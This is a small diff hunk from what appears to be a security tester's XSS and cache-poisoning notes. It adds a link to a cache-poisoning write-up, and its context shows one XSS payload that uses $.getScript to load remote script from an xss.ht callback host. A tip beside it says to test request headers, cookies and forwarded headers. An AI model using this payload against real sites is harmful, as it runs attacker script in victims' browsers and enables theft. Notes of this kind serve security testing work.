@@ -137,3 +137,6 @@ Visitor.id='xssx'*$.getScript`//593.xss.ht`//;
 </script>
 Tip & Trick
 Test for XSS on any Request Header, Cookies, Custom Headers, X-Forwared-* Headers
+
+
+https://youst.in/posts/cache-poisoning-at-scale/
